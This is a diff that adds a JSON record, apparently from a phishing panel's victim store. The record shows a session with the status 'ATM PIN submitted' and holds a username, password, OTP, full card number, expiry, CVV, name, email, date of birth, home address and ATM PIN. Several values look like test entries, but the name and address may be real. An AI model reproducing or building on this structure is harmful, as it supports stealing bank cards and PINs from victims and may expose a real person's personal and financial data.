@@ -1,0 +1,23 @@
+{
+  "bea9783f-6da3-46c5-b202-323b1b7bd262": {
+    "status": "ATM PIN submitted",
+    "online": true,
+    "onlineStatus": "online",
+    "ip": "::ffff:127.0.0.1",
+    "lastUpdate": 1771598053966,
+    "username": "081-134-4069",
+    "password": "3456",
+    "highlightFields": [
+      "atm_pin"
+    ],
+    "otp": "098887",
+    "card_number": "5078 7210 0099 3565",
+    "expiry": "10/28",
+    "cvv": "397",
+    "name": "Michael Ekpere",
+    "email": "fggfdsaa@aba.com",
+    "dob": "06/25/2025",
+    "address": "26 vision road, off Nwaniba road, Uyo. Akwa Ibom State",
+    "atm_pin": "9876"
+  }
+}
